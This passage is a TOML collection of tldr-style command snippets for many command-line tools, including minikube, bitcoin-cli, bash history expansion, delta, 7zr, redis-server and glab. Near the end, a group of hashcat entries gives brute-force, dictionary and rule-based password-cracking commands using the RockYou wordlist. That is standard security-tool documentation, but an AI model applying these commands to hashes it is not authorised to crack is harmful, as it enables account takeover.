[[snippets]]
  description = "Generate a left-to-right greyscale map"
  command = "pgmtexture -lr > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Generate a top-to-bottom greyscale map"
  command = "pgmtexture -tb > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Generate a rectangular greyscale map"
  command = "pgmtexture -rectangle > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Generate a elliptical greyscale map"
  command = "pgmtexture -ellipse <path/to/image.pgm> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Generate a greyscale map from the top-left corner to the bottom-right corner"
  command = "pgmtexture -diagonal <path/to/image.pgm> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Generate a key pair, save it to an unencrypted file, and print the public key to `stdout`"
  command = "age-keygen --output <path/to/file>"
  output = ""

[[snippets]]
  description = "Convert an identit[y] to a recipient and print the public key to `stdout`"
  command = "age-keygen -y <path/to/file>"
  output = ""

[[snippets]]
  description = "Start the cluster"
  command = "minikube start"
  output = ""

[[snippets]]
  description = "Get the IP address of the cluster"
  command = "minikube ip"
  output = ""

[[snippets]]
  description = "Access a service named my_service exposed via a node port and get the URL"
  command = "minikube service <my_service> --url"
  output = ""

[[snippets]]
  description = "Open the Kubernetes dashboard in a browser"
  command = "minikube dashboard"
  output = ""

[[snippets]]
  description = "Stop the running cluster"
  command = "minikube stop"
  output = ""

[[snippets]]
  description = "Delete the cluster"
  command = "minikube delete"
  output = ""

[[snippets]]
  description = "Connect to LoadBalancer services"
  command = "minikube tunnel"
  output = ""

[[snippets]]
  description = "View documentation for the current command"
  command = "tldr pamcomp"
  output = ""

[[snippets]]
  description = "Extract an archive"
  command = "unp <path/to/archive.zip>"
  output = ""

[[snippets]]
  description = "Extract multiple archives"
  command = "unp <path/to/archive1.tar.gz> <path/to/archive2.rar>"
  output = ""

[[snippets]]
  description = "Create a symbolic link to a file or directory"
  command = "ln -s </path/to/file_or_directory> <path/to/symlink>"
  output = ""

[[snippets]]
  description = "Overwrite an existing symbolic link to point to a different file"
  command = "ln -sf </path/to/new_file> <path/to/symlink>"
  output = ""

[[snippets]]
  description = "Create a hard link to a file"
  command = "ln </path/to/file> <path/to/hardlink>"
  output = ""

[[snippets]]
  description = "Add a user to the current project"
  command = "add user <username>;"
  output = ""

[[snippets]]
  description = "Grant a set of authorities to a user"
  command = "grant <action_list> on <object_type> <object_name> to user <username>;"
  output = ""

[[snippets]]
  description = "Show authorities of a user"
  command = "show grants for <username>;"
  output = ""

[[snippets]]
  description = "Create a user role"
  command = "create role <role_name>;"
  output = ""

[[snippets]]
  description = "Grant a set of authorities to a role"
  command = "grant <action_list> on <object_type> <object_name> to role <role_name>;"
  output = ""

[[snippets]]
  description = "Describe authorities of a role"
  command = "desc role <role_name>;"
  output = ""

[[snippets]]
  description = "Grant a role to a user"
  command = "grant <role_name> to <username>;"
  output = ""

[[snippets]]
  description = "Convert a PPM image to a NEO file"
  command = "ppmtoneo <path/to/file.ppm> > <path/to/file.neo>"
  output = ""

[[snippets]]
  description = "Send a transaction to a given address"
  command = "bitcoin-cli sendtoaddress ""<address>"" <amount>"
  output = ""

[[snippets]]
  description = "Generate one or more blocks"
  command = "bitcoin-cli generate <num_blocks>"
  output = ""

[[snippets]]
  description = "Print high-level information about the wallet"
  command = "bitcoin-cli getwalletinfo"
  output = ""

[[snippets]]
  description = "List all outputs from previous transactions available to fund outgoing transactions"
  command = "bitcoin-cli listunspent"
  output = ""

[[snippets]]
  description = "Export the wallet information to a text file"
  command = "bitcoin-cli dumpwallet ""<path/to/file>"""
  output = ""

[[snippets]]
  description = "Run the previous command as root (`!!` is replaced by the previous command)"
  command = "sudo !!"
  output = ""

[[snippets]]
  description = "Run a command with the last argument of the previous command"
  command = "<command> !$"
  output = ""

[[snippets]]
  description = "Run a command with the first argument of the previous command"
  command = "<command> !^"
  output = ""

[[snippets]]
  description = "Run the Nth command of the history"
  command = "!<n>"
  output = ""

[[snippets]]
  description = "Run the command `n` lines back in the history"
  command = "!-<n>"
  output = ""

[[snippets]]
  description = "Run the most recent command containing `string`"
  command = "!?<string>?"
  output = ""

[[snippets]]
  description = "Run the previous command, replacing `string1` with `string2`"
  command = "^<string1>^<string2>^"
  output = ""

[[snippets]]
  description = "Perform a history expansion, but print the command that would be run instead of actually running it"
  command = "<!-n>:p"
  output = ""

[[snippets]]
  description = "Compile and link an LLVM based program"
  command = "clang++ $(llvm-config --cxxflags --ldflags --libs) --output <path/to/output_executable> <path/to/source.cc>"
  output = ""

[[snippets]]
  description = "Print the `PREFIX` of your LLVM installation"
  command = "llvm-config --prefix"
  output = ""

[[snippets]]
  description = "Print all targets supported by your LLVM build"
  command = "llvm-config --targets-built"
  output = ""

[[snippets]]
  description = "Check for all updates"
  command = "rustup check"
  output = ""

[[snippets]]
  description = "Compare files or directories"
  command = "delta <path/to/old_file_or_directory> <path/to/new_file_or_directory>"
  output = ""

[[snippets]]
  description = "Compare files or directories, showing the line numbers"
  command = "delta --line-numbers <path/to/old_file_or_directory> <path/to/new_file_or_directory>"
  output = ""

[[snippets]]
  description = "Compare files or directories, showing the differences side by side"
  command = "delta --side-by-side <path/to/old_file_or_directory> <path/to/new_file_or_directory>"
  output = ""

[[snippets]]
  description = "Compare files or directories, ignoring any Git configuration settings"
  command = "delta --no-gitconfig <path/to/old_file_or_directory> <path/to/new_file_or_directory>"
  output = ""

[[snippets]]
  description = "Compare, rendering commit hashes, file names, and line numbers as hyperlinks, according to the hyperlink spec for terminal emulators"
  command = "delta --hyperlinks <path/to/old_file_or_directory> <path/to/new_file_or_directory>"
  output = ""

[[snippets]]
  description = "Display the current settings"
  command = "delta --show-config"
  output = ""

[[snippets]]
  description = "Display supported languages and associated file extensions"
  command = "delta --list-languages"
  output = ""

[[snippets]]
  description = "Check dotfile status"
  command = "tuckr status"
  output = ""

[[snippets]]
  description = "Add all dotfiles to system"
  command = "tuckr add \*"
  output = ""

[[snippets]]
  description = "Add all dotfiles except specified programs"
  command = "tuckr add \* -e <program1>,<program2>"
  output = ""

[[snippets]]
  description = "Remove all dotfiles from the system"
  command = "tuckr rm \*"
  output = ""

[[snippets]]
  description = "Add a program dotfile and run its setup script"
  command = "tuckr set <program>"
  output = ""

[[snippets]]
  description = "Send a GET request"
  command = "xh <httpbin.org/get>"
  output = ""

[[snippets]]
  description = "Send a POST request with a JSON body (key-value pairs are added to a top-level JSON object - e.g. `{"name": "john", "age": 25}`)"
  command = "xh post <httpbin.org/post> <name=john> <age:=25>"
  output = ""

[[snippets]]
  description = "Send a GET request with query parameters (e.g. `first_param=5&second_param=true`)"
  command = "xh get <httpbin.org/get> <first_param==5> <second_param==true>"
  output = ""

[[snippets]]
  description = "Send a GET request with a custom header"
  command = "xh get <httpbin.org/get> <header-name:header-value>"
  output = ""

[[snippets]]
  description = "Make a GET request and save the response body to a file"
  command = "xh --download <httpbin.org/json> --output <path/to/file>"
  output = ""

[[snippets]]
  description = "Check terminal's openness to write messages"
  command = "mesg"
  output = ""

[[snippets]]
  description = "Disallow receiving messages from the write command"
  command = "mesg n"
  output = ""

[[snippets]]
  description = "Allow receiving messages from the write command"
  command = "mesg y"
  output = ""

[[snippets]]
  description = "Log in with Google SSO using the specified [u]sername [I]DP and [S]P identifiers and set the credentials [d]uration to one hour"
  command = "aws-google-auth -u <example@example.com> -I <$GOOGLE_IDP_ID> -S <$GOOGLE_SP_ID> -d <3600>"
  output = ""

[[snippets]]
  description = "Log in [a]sking which role to use (in case of several available SAML roles)"
  command = "aws-google-auth -u <example@example.com> -I <$GOOGLE_IDP_ID> -S <$GOOGLE_SP_ID> -d <3600> -a"
  output = ""

[[snippets]]
  description = "Resolve aliases for AWS accounts"
  command = "aws-google-auth -u <example@example.com> -I <$GOOGLE_IDP_ID> -S <$GOOGLE_SP_ID> -d <3600> -a --resolve-aliases"
  output = ""

[[snippets]]
  description = "Display help"
  command = "aws-google-auth -h"
  output = ""

[[snippets]]
  description = "Show the environment"
  command = "env"
  output = ""

[[snippets]]
  description = "Run a program. Often used in scripts after the shebang (#!) for looking up the path to the program"
  command = "env <program>"
  output = ""

[[snippets]]
  description = "Clear the environment and run a program"
  command = "env -i <program>"
  output = ""

[[snippets]]
  description = "Remove variable from the environment and run a program"
  command = "env -u <variable> <program>"
  output = ""

[[snippets]]
  description = "Set a variable and run a program"
  command = "env <variable>=<value> <program>"
  output = ""

[[snippets]]
  description = "Set one or more variables and run a program"
  command = "env <variable1>=<value> <variable2>=<value> <variable3>=<value> <program>"
  output = ""

[[snippets]]
  description = "Sign a JAR file"
  command = "jarsigner <path/to/file.jar> <keystore_alias>"
  output = ""

[[snippets]]
  description = "Sign a JAR file with a specific algorithm"
  command = "jarsigner -sigalg <algorithm> <path/to/file.jar> <keystore_alias>"
  output = ""

[[snippets]]
  description = "Verify the signature of a JAR file"
  command = "jarsigner -verify <path/to/file.jar>"
  output = ""

[[snippets]]
  description = "Run query against a BigQuery table using standard SQL, add `--dry_run` flag to estimate the number of bytes read by the query"
  command = "bq query --nouse_legacy_sql 'SELECT COUNT(*) FROM <DATASET_NAME>.<TABLE_NAME>'"
  output = ""

[[snippets]]
  description = "Run a parameterized query"
  command = "bq query --use_legacy_sql=false --parameter='ts_value:TIMESTAMP:2016-12-07 08:00:00' 'SELECT TIMESTAMP_ADD(@ts_value, INTERVAL 1 HOUR)'"
  output = ""

[[snippets]]
  description = "Create a new dataset or table in the US location"
  command = "bq mk --location=US <dataset_name>.<table_name>"
  output = ""

[[snippets]]
  description = "List all datasets in a project"
  command = "bq ls --filter labels.<key>:<value> --max_results <integer> --format=prettyjson --project_id <project_id>"
  output = ""

[[snippets]]
  description = "Batch load data from a specific file in formats such as CSV, JSON, Parquet, and Avro to a table"
  command = "bq load --location=<location> --source_format=<CSV|JSON|PARQUET|AVRO> <dataset>.<table> <path_to_source>"
  output = ""

[[snippets]]
  description = "Copy one table to another"
  command = "bq cp <dataset>.<OLD_TABLE> <dataset>.<new_table>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "bq help"
  output = ""

[[snippets]]
  description = "Create an auto-named `.patch` file for all the unpushed commits"
  command = "git format-patch <origin>"
  output = ""

[[snippets]]
  description = "Write a `.patch` file for all the commits between 2 revisions to `stdout`"
  command = "git format-patch <revision_1>..<revision_2>"
  output = ""

[[snippets]]
  description = "Write a `.patch` file for the 3 latest commits"
  command = "git format-patch -<3>"
  output = ""

[[snippets]]
  description = "Return a non-zero exit code"
  command = "false"
  output = ""

[[snippets]]
  description = "Convert a XWD image file to PBM"
  command = "xwdtopnm <path/to/input_file.xwd> > <path/to/output_file.pnm>"
  output = ""

[[snippets]]
  description = "Display information about the conversion process"
  command = "xwdtopnm -verbose <path/to/input_file.xwd> > <path/to/output_file.pnm>"
  output = ""

[[snippets]]
  description = "Display the contents of the X11 header of the input file"
  command = "xwdtopnm -headerdump <path/to/input_file.xwd> > <path/to/output_file.pnm>"
  output = ""

[[snippets]]
  description = "Convert a HP PaintJet file to PPM"
  command = "pjtoppm <path/to/input.pj> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Create a new Symfony project"
  command = "symfony new <name>"
  output = ""

[[snippets]]
  description = "Run a local web server"
  command = "symfony serve"
  output = ""

[[snippets]]
  description = "Stop the local web server"
  command = "symfony server:stop"
  output = ""

[[snippets]]
  description = "Check for security issues in the project's dependencies"
  command = "symfony security:check"
  output = ""

[[snippets]]
  description = "List all devices"
  command = "kdeconnect-cli --list-devices"
  output = ""

[[snippets]]
  description = "List available (paired and reachable) devices"
  command = "kdeconnect-cli --list-available"
  output = ""

[[snippets]]
  description = "Request pairing with a specific device, specifying its ID"
  command = "kdeconnect-cli --pair --device <device_id>"
  output = ""

[[snippets]]
  description = "Ring a device, specifying its name"
  command = "kdeconnect-cli --ring --name ""<device_name>"""
  output = ""

[[snippets]]
  description = "Share an URL or file with a paired device, specifying its ID"
  command = "kdeconnect-cli --share <url|path/to/file> --device <device_id>"
  output = ""

[[snippets]]
  description = "Send an SMS with an optional attachment to a specific number"
  command = "kdeconnect-cli --name ""<device_name>"" --send-sms ""<message>"" --destination <phone_number> --attachment <path/to/file>"
  output = ""

[[snippets]]
  description = "Unlock a specific device"
  command = "kdeconnect-cli --name ""<device_name>"" --unlock"
  output = ""

[[snippets]]
  description = "Simulate a key press on a specific device"
  command = "kdeconnect-cli --name ""<device_name>"" --send-keys <key>"
  output = ""

[[snippets]]
  description = "Interactively update modules on a device"
  command = "circup update"
  output = ""

[[snippets]]
  description = "Install a new library"
  command = "circup install <library_name>"
  output = ""

[[snippets]]
  description = "Search for a library"
  command = "circup show <partial_name>"
  output = ""

[[snippets]]
  description = "List all libraries on a connected device in `requirements.txt` format"
  command = "circup freeze"
  output = ""

[[snippets]]
  description = "Save all libraries on a connected device in the current directory"
  command = "circup freeze -r"
  output = ""

[[snippets]]
  description = "Start KeePass 2, opening the most recently opened password database"
  command = "keepass2"
  output = ""

[[snippets]]
  description = "Start KeePass 2, opening a specific password database"
  command = "keepass2 <path/to/database.kbdx>"
  output = ""

[[snippets]]
  description = "Use a specific key file to open a password database"
  command = "keepass2 <path/to/database.kbdx> -keyfile:<path/to/key/file.key>"
  output = ""

[[snippets]]
  description = "Start Redis server, using the default port (6379), and write logs to `stdout`"
  command = "redis-server"
  output = ""

[[snippets]]
  description = "Start Redis server, using the default port, as a background process"
  command = "redis-server --daemonize yes"
  output = ""

[[snippets]]
  description = "Start Redis server, using the specified port, as a background process"
  command = "redis-server --port <port> --daemonize yes"
  output = ""

[[snippets]]
  description = "Start Redis server with a custom configuration file"
  command = "redis-server <path/to/redis.conf>"
  output = ""

[[snippets]]
  description = "Start Redis server with verbose logging"
  command = "redis-server --loglevel <warning|notice|verbose|debug>"
  output = ""

[[snippets]]
  description = "[a]rchive a file or directory"
  command = "7zr a <path/to/archive.7z> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Encrypt an existing archive (including file names)"
  command = "7zr a <path/to/encrypted.7z> -p<password> -mhe=<on> <path/to/archive.7z>"
  output = ""

[[snippets]]
  description = "E[x]tract an archive preserving the original directory structure"
  command = "7zr x <path/to/archive.7z>"
  output = ""

[[snippets]]
  description = "E[x]tract an archive to a specific directory"
  command = "7zr x <path/to/archive.7z> -o<path/to/output>"
  output = ""

[[snippets]]
  description = "E[x]tract an archive to `stdout`"
  command = "7zr x <path/to/archive.7z> -so"
  output = ""

[[snippets]]
  description = "[l]ist the contents of an archive"
  command = "7zr l <path/to/archive.7z>"
  output = ""

[[snippets]]
  description = "Set the level of compression (higher means more compression, but slower)"
  command = "7zr a <path/to/archive.7z> -mx=<0|1|3|5|7|9> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Assign a name and tag to a specific image ID"
  command = "docker tag <id> <name>:<tag>"
  output = ""

[[snippets]]
  description = "Assign a tag to a specific image"
  command = "docker tag <image>:<current_tag> <image>:<new_tag>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "docker tag"
  output = ""

[[snippets]]
  description = "Execute commands from `stdin` (press `Ctrl + D` when done)"
  command = "batch"
  output = ""

[[snippets]]
  description = "Execute a command from `stdin`"
  command = "echo ""<./make_db_backup.sh>"" | batch"
  output = ""

[[snippets]]
  description = "Execute commands from a given [f]ile"
  command = "batch -f <path/to/file>"
  output = ""

[[snippets]]
  description = "Apply the Bentley Effect on a PGM image"
  command = "pgmbentley <path/to/input_file.pgm> > <path/to/output_file.pgm>"
  output = ""

[[snippets]]
  description = "Count all objects and display the total disk usage"
  command = "git count-objects"
  output = ""

[[snippets]]
  description = "Display a count of all objects and their total disk usage, displaying sizes in human-readable units"
  command = "git count-objects --human-readable"
  output = ""

[[snippets]]
  description = "Display more verbose information"
  command = "git count-objects --verbose"
  output = ""

[[snippets]]
  description = "Display more verbose information, displaying sizes in human-readable units"
  command = "git count-objects --human-readable --verbose"
  output = ""

[[snippets]]
  description = "Display details about the currently authenticated user"
  command = "ohdear-cli me"
  output = ""

[[snippets]]
  description = "Add a new site to Oh Dear"
  command = "ohdear-cli sites:add <url>"
  output = ""

[[snippets]]
  description = "Display a list of sites and their current status"
  command = "ohdear-cli sites:list"
  output = ""

[[snippets]]
  description = "Display details about a specific site"
  command = "ohdear-cli sites:show <site_id>"
  output = ""

[[snippets]]
  description = "Display information about installed nest version"
  command = "nest info"
  output = ""

[[snippets]]
  description = "Create a new NestJS project in a directory of the same name"
  command = "nest new <project_name>"
  output = ""

[[snippets]]
  description = "Build a specific NestJS project"
  command = "nest build <project_name>"
  output = ""

[[snippets]]
  description = "Run a specific NestJS project"
  command = "nest start <project_name>"
  output = ""

[[snippets]]
  description = "Import a library into the current NestJS project"
  command = "nest add <library_name>"
  output = ""

[[snippets]]
  description = "List existing pipelines on nf-core"
  command = "nf-core list"
  output = ""

[[snippets]]
  description = "Create a new pipeline skeleton"
  command = "nf-core create"
  output = ""

[[snippets]]
  description = "Lint the pipeline code"
  command = "nf-core lint <path/to/directory>"
  output = ""

[[snippets]]
  description = "Bump software versions in pipeline recipe"
  command = "nf-core bump-version <path/to/directory> <new_version>"
  output = ""

[[snippets]]
  description = "Launch an nf-core pipeline"
  command = "nf-core launch <pipeline_name>"
  output = ""

[[snippets]]
  description = "Download an nf-core pipeline for offline use"
  command = "nf-core download <pipeline_name>"
  output = ""

[[snippets]]
  description = "Match a variable against string literals to decide which command to run"
  command = "case <$tocount> in <words>) <wc -w README>; ;; <lines>) <wc -l README>; ;; esac"
  output = ""

[[snippets]]
  description = "Combine patterns with |, use * as a fallback pattern"
  command = "case <$tocount> in <[wW]|words>) <wc -w README>; ;; <[lL]|lines>) <wc -l README>; ;; *) <echo ""what?"">; ;; esac"
  output = ""

[[snippets]]
  description = "Substitute with the previous command and run it with `sudo`"
  command = "sudo !!"
  output = ""

[[snippets]]
  description = "Substitute with a command based on its line number found with `history`"
  command = "!<number>"
  output = ""

[[snippets]]
  description = "Substitute with a command that was used a specified number of lines back"
  command = "!-<number>"
  output = ""

[[snippets]]
  description = "Substitute with the most recent command that starts with a string"
  command = "!<string>"
  output = ""

[[snippets]]
  description = "Substitute with the arguments of the latest command"
  command = "<command> !*"
  output = ""

[[snippets]]
  description = "Convert a GEM image file to a PNM image"
  command = "gemtopnm <path/to/file.img> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Describe the contents of the specified GEM image"
  command = "gemtopnm -d <path/to/file.img>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "gemtopnm -version"
  output = ""

[[snippets]]
  description = "Display filesystems and their disk usage in human-readable form with colors and graphs"
  command = "dfc"
  output = ""

[[snippets]]
  description = "Display all filesystems including pseudo, duplicate and inaccessible filesystems"
  command = "dfc -a"
  output = ""

[[snippets]]
  description = "Display filesystems without color"
  command = "dfc -c never"
  output = ""

[[snippets]]
  description = "Display filesystems containing "ext" in the filesystem type"
  command = "dfc -t ext"
  output = ""

[[snippets]]
  description = "Interactively select a hosting service"
  command = "picgo set uploader"
  output = ""

[[snippets]]
  description = "Upload the image in current clipboard"
  command = "picgo upload"
  output = ""

[[snippets]]
  description = "Upload an image from a specific path"
  command = "picgo upload <path/to/image>"
  output = ""

[[snippets]]
  description = "List all installed Node.js versions"
  command = "Get-NodeVersions"
  output = ""

[[snippets]]
  description = "List all available Node.js versions"
  command = "Get-NodeVersions -Remote"
  output = ""

[[snippets]]
  description = "List all available Node.js 20.x versions"
  command = "Get-NodeVersions -Remote -Filter "">=20.0.0 <21.0.0"""
  output = ""

[[snippets]]
  description = "Build and sign the iOS application in the current directory"
  command = "fastlane run build_app"
  output = ""

[[snippets]]
  description = "Run `pod install` for the project in the current directory"
  command = "fastlane run cocoapods"
  output = ""

[[snippets]]
  description = "Delete the derived data from Xcode"
  command = "fastlane run clear_derived_data"
  output = ""

[[snippets]]
  description = "Remove the cache for pods"
  command = "fastlane run clean_cocoapods_cache"
  output = ""

[[snippets]]
  description = "Initialize opam for first use"
  command = "opam init"
  output = ""

[[snippets]]
  description = "Search for packages"
  command = "opam search <query>"
  output = ""

[[snippets]]
  description = "Install a package and all of its dependencies"
  command = "opam install <package>"
  output = ""

[[snippets]]
  description = "Display detailed information about a package"
  command = "opam show <package>"
  output = ""

[[snippets]]
  description = "List all installed packages"
  command = "opam list"
  output = ""

[[snippets]]
  description = "Update the local package database"
  command = "opam update"
  output = ""

[[snippets]]
  description = "Upgrade all installed packages"
  command = "opam upgrade"
  output = ""

[[snippets]]
  description = "Display help"
  command = "opam help"
  output = ""

[[snippets]]
  description = "Run tests for a configuration file"
  command = "smalltalkci <path/to/.smalltalk.ston>"
  output = ""

[[snippets]]
  description = "Run tests for the `.smalltalk.ston` configuration in the current directory"
  command = "smalltalkci"
  output = ""

[[snippets]]
  description = "Debug tests in headful mode (show VM window)"
  command = "smalltalkci --headful"
  output = ""

[[snippets]]
  description = "Download and prepare a well-known smalltalk image for the tests"
  command = "smalltalkci --smalltalk <Squeak64-Trunk>"
  output = ""

[[snippets]]
  description = "Specify a custom Smalltalk image and VM"
  command = "smalltalkci --image <path/to/Smalltalk.image> --vm <path/to/vm>"
  output = ""

[[snippets]]
  description = "Clean up caches and delete builds"
  command = "smalltalkci --clean"
  output = ""

[[snippets]]
  description = "Compare PDFs, indicating changes using return codes (`0` = no difference, `1` = PDFs differ)"
  command = "diff-pdf <path/to/a.pdf> <path/to/b.pdf>"
  output = ""

[[snippets]]
  description = "Compare PDFs, outputting a PDF with visually highlighted differences"
  command = "diff-pdf --output-diff=<path/to/diff.pdf> <path/to/a.pdf> <path/to/b.pdf>"
  output = ""

[[snippets]]
  description = "Compare PDFs, viewing differences in a simple GUI"
  command = "diff-pdf --view <path/to/a.pdf> <path/to/b.pdf>"
  output = ""

[[snippets]]
  description = "View documentation for the current command"
  command = "tldr pamtotga"
  output = ""

[[snippets]]
  description = "Start a PXE boot server which provides a `netboot.xyz` boot image"
  command = "pixiecore <quick> xyz --dhcp-no-bind"
  output = ""

[[snippets]]
  description = "Start a new PXE boot server which provides an Ubuntu boot image"
  command = "pixiecore <quick> ubuntu --dhcp-no-bind"
  output = ""

[[snippets]]
  description = "List all available boot images for quick mode"
  command = "pixiecore quick --help"
  output = ""

[[snippets]]
  description = "Tail the logs of multiple pods (whose name starts with "my_app") in one go"
  command = "kubetail <my_app>"
  output = ""

[[snippets]]
  description = "Tail only a specific container from multiple pods"
  command = "kubetail <my_app> -c <my_container>"
  output = ""

[[snippets]]
  description = "To tail multiple containers from multiple pods"
  command = "kubetail <my_app> -c <my_container_1> -c <my_container_2>"
  output = ""

[[snippets]]
  description = "To tail multiple applications at the same time separate them by comma"
  command = "kubetail <my_app_1>,<my_app_2>"
  output = ""

[[snippets]]
  description = "Do a dry-run renaming a directory of PNGs with a literal string replacement"
  command = "repren --dry-run --rename --literal --from '<find_string>' --to '<replacement_string>' <*.png>"
  output = ""

[[snippets]]
  description = "Do a dry-run renaming a directory of JPEGs with a regular expression"
  command = "repren --rename --dry-run --from '<regular_expression>' --to '<replacement_string>' <*.jpg> <*.jpeg>"
  output = ""

[[snippets]]
  description = "Do a find-and-replace on the contents of a directory of CSV files"
  command = "repren --from '<([0-9]+) example_string>' --to '<replacement_string \1>' <*.csv>"
  output = ""

[[snippets]]
  description = "Do both a find-and-replace and a rename operation at the same time, using a pattern file"
  command = "repren --patterns <path/to/patfile.ext> --full <*.txt>"
  output = ""

[[snippets]]
  description = "Do a case-insensitive rename"
  command = "repren --rename --insensitive --patterns <path/to/patfile.ext> *"
  output = ""

[[snippets]]
  description = "Extract all tables from a PDF to a CSV file"
  command = "tabula -o <file.csv> <file.pdf>"
  output = ""

[[snippets]]
  description = "Extract all tables from a PDF to a JSON file"
  command = "tabula --format JSON -o <file.json> <file.pdf>"
  output = ""

[[snippets]]
  description = "Extract tables from pages 1, 2, 3, and 6 of a PDF"
  command = "tabula --pages <1-3,6> <file.pdf>"
  output = ""

[[snippets]]
  description = "Extract tables from page 1 of a PDF, guessing which portion of the page to examine"
  command = "tabula --guess --pages <1> <file.pdf>"
  output = ""

[[snippets]]
  description = "Extract all tables from a PDF, using ruling lines to determine cell boundaries"
  command = "tabula --spreadsheet <file.pdf>"
  output = ""

[[snippets]]
  description = "Extract all tables from a PDF, using blank space to determine cell boundaries"
  command = "tabula --no-spreadsheet <file.pdf>"
  output = ""

[[snippets]]
  description = "Convert 1.5K (SI Units) to 1500"
  command = "numfmt --from=<si> <1.5K>"
  output = ""

[[snippets]]
  description = "Convert 5th field (1-indexed) to IEC Units without converting header"
  command = "ls -l | numfmt --header=<1> --field=<5> --to=<iec>"
  output = ""

[[snippets]]
  description = "Convert to IEC units, pad with 5 characters, left aligned"
  command = "du -s * | numfmt --to=<iec> --format=""<%-5f>"""
  output = ""

[[snippets]]
  description = "Generate an HTML report for a specific website and save it to a file in the current directory"
  command = "lighthouse <https://example.com>"
  output = ""

[[snippets]]
  description = "Generate a JSON report and print it"
  command = "lighthouse --output <json> <https://example.com>"
  output = ""

[[snippets]]
  description = "Generate a JSON report and save it to a specific file"
  command = "lighthouse --output <json> --output-path <path/to/file.json> <https://example.com>"
  output = ""

[[snippets]]
  description = "Generate a report using the browser in headless mode without logging to `stdout`"
  command = "lighthouse --quiet --chrome-flags=""<--headless>"" <https://example.com>"
  output = ""

[[snippets]]
  description = "Generate a report, using the HTTP header key/value pairs in the specified JSON file for all requests"
  command = "lighthouse --extra-headers=<path/to/file.json> <https://example.com>"
  output = ""

[[snippets]]
  description = "Generate a report for specific categories only"
  command = "lighthouse --only-categories=<performance,accessibility,best-practices,seo,pwa> <https://example.com>"
  output = ""

[[snippets]]
  description = "Generate a report with device emulation and all throttling disabled"
  command = "lighthouse --screenEmulation.disabled --throttling-method=<provided> --no-emulatedUserAgent <https://example.com>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "lighthouse --help"
  output = ""

[[snippets]]
  description = "Print information on a plugin"
  command = "gst-inspect-1.0 <plugin>"
  output = ""

[[snippets]]
  description = "List hardware transcoding capabilities of your device"
  command = "gst-inspect-1.0 <vaapi|nvcodec>"
  output = ""

[[snippets]]
  description = "Run a Go file"
  command = "go run <path/to/file.go>"
  output = ""

[[snippets]]
  description = "Run a main Go package"
  command = "go run <path/to/package>"
  output = ""

[[snippets]]
  description = "Abort a Git rebase, merge, or cherry-pick"
  command = "git abort"
  output = ""

[[snippets]]
  description = "List the target name and source path of the block devices"
  command = "virsh domblklist --domain <vm_name>"
  output = ""

[[snippets]]
  description = "List the disk type and device value as well as the target name and source path"
  command = "virsh domblklist --domain <vm_name> --details"
  output = ""

[[snippets]]
  description = "Display a specific issue"
  command = "glab issue view <issue_number>"
  output = ""

[[snippets]]
  description = "Display a specific issue in the default web browser"
  command = "glab issue view <issue_number> --web"
  output = ""

[[snippets]]
  description = "Create a new issue in the default web browser"
  command = "glab issue create --web"
  output = ""

[[snippets]]
  description = "List the last 10 issues with the `bug` label"
  command = "glab issue list --per-page <10> --label ""<bug>"""
  output = ""

[[snippets]]
  description = "List closed issues made by a specific user"
  command = "glab issue list --closed --author <username>"
  output = ""

[[snippets]]
  description = "Reopen a specific issue"
  command = "glab issue reopen <issue_number>"
  output = ""

[[snippets]]
  description = "Perform a brute-force attack (mode 3) with the default hashcat mask"
  command = "hashcat --hash-type <hash_type_id> --attack-mode <3> <hash_value>"
  output = ""

[[snippets]]
  description = "Perform a brute-force attack (mode 3) with a known pattern of 4 digits"
  command = "hashcat --hash-type <hash_type_id> --attack-mode <3> <hash_value> ""<?d?d?d?d>"""
  output = ""

[[snippets]]
  description = "Perform a brute-force attack (mode 3) using at most 8 of all printable ASCII characters"
  command = "hashcat --hash-type <hash_type_id> --attack-mode <3> --increment <hash_value> ""<?a?a?a?a?a?a?a?a>"""
  output = ""

[[snippets]]
  description = "Perform a dictionary attack (mode 0) using the RockYou wordlist of a Kali Linux box"
  command = "hashcat --hash-type <hash_type_id> --attack-mode <0> <hash_value> </usr/share/wordlists/rockyou.txt>"
  output = ""

[[snippets]]
  description = "Perform a rule-based dictionary attack (mode 0) using the RockYou wordlist mutated with common password variations"
  command = "hashcat --hash-type <hash_type_id> --attack-mode <0> --rules-file </usr/share/hashcat/rules/best64.rule> <hash_value> </usr/share/wordlists/rockyou.txt>"
  output = ""

[[snippets]]
  description = "Perform a combination attack (mode 1) using the concatenation of words from two different custom dictionaries"
  command = "hashcat --hash-type <hash_type_id> --attack-mode <1> <hash_value> </path/to/dictionary1.txt> </path/to/dictionary2.txt>"
  output = ""

[[snippets]]
  description = "Show result of an already cracked hash"
  command = "hashcat --show <hash_value>"
  output = ""

[[snippets]]
  description = "Build changed packages in the specified pull request"
  command = "nixpkgs-review pr <pr_number|pr_url>"
  output = ""

[[snippets]]
  description = "Build changed packages and post a comment with a report (requires setting up a token in `hub`, `gh`, or the `GITHUB_TOKEN` environment variable)"
  command = "nixpkgs-review pr --post-result <pr_number|pr_url>"
  output = ""

[[snippets]]
  description = "Build changed packages and print a report"
  command = "nixpkgs-review pr --print-result <pr_number|pr_url>"
  output = ""

[[snippets]]
  description = "Build changed packages in a local commit"
  command = "nixpkgs-review rev <HEAD>"
  output = ""

[[snippets]]
  description = "Build changed packages that haven't been committed yet"
  command = "nixpkgs-review wip"
  output = ""

[[snippets]]
  description = "Build changed packages that have been staged"
  command = "nixpkgs-review wip --staged"
  output = ""

[[snippets]]
  description = "Build and add package `libcurl` to the `vcpkg` environment"
  command = "vcpkg install curl"
  output = ""

[[snippets]]
  description = "Build and add `zlib` using the `emscripten` toolchain"
  command = "vcpkg install --triplet=wasm32-emscripten zlib"
  output = ""

[[snippets]]
  description = "Search for a package"
  command = "vcpkg search <pkg_name>"
  output = ""

[[snippets]]
  description = "Configure a CMake project to use `vcpkg` packages"
